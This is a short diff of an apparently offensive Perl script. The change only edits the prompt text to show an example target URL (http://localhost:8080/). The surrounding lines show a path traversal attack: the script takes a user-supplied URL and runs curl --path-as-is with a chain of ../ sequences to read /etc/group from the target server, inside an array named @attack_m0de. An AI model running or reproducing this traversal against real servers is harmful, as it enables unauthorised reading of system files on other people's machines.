@@ -4,7 +4,7 @@ use warnings;
 use strict;
 use diagnostics;
 
-print "Give URL target\n";
+print "Give URL target for example: http://localhost:8080/\n";
 chomp (my $URL_target = <STDIN>);
 my @attack_m0de = (
 		[my $m1 = `curl --path-as-is $URL_target../../../../../../etc/group`], 
